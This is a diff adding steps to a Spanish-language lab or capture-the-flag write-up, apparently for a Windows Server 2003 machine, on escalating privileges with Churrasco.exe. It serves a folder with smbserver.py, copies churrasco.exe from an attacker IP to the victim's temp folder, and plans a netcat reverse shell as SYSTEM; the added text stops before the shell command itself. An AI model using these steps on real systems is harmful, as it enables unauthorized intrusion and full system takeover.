@@ -88,6 +88,25 @@ Viendo que esta corriendo un *Windows Server 2003* en los CLSID del GitHub no in
 Por lo cual tendremos que usar otra herramienta similar a esta, en este caso vamos a usar [[CHURRASCO]] `https://github.com/Re4son/Churrasco/raw/master/churrasco.exe` que se usa para versiones antiguas de *Windows Server*
 `https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/`
 
-Nos compartiremos 
+Nos compartiremos como un recurso compartido a nivel de red con [[SMBSERVER]]
+```shell
+smbserver.py smbFolder $(pwd) 
+```
+
+En la maquina victima navegaremos a `C:\Windows\Temp` y nos descargaremos en esa ubicación el archivo
+```shell
+copy \\10.10.14.226\smbFolder\churrasco.exe churrasco.exe
+```
+
+Ahora podremos ejecutar la herramienta, de forma que nos competiremos el [[NETCAT]] a nivel de recurso de red con [[SMBSERVER]] y poniéndonos en escucha en nuestra maquina podemos obtener una *Reverse Shell* como *NT AUTHORITY\SYSTEM*
+
+Primero nos comaptiremos el recurso a nivel de red
+```shell
+smbserver.py smbFolder $(pwd)
+```
+
+Nos pondremos en escucha en el puesrto seleccionado
+
+
 
 
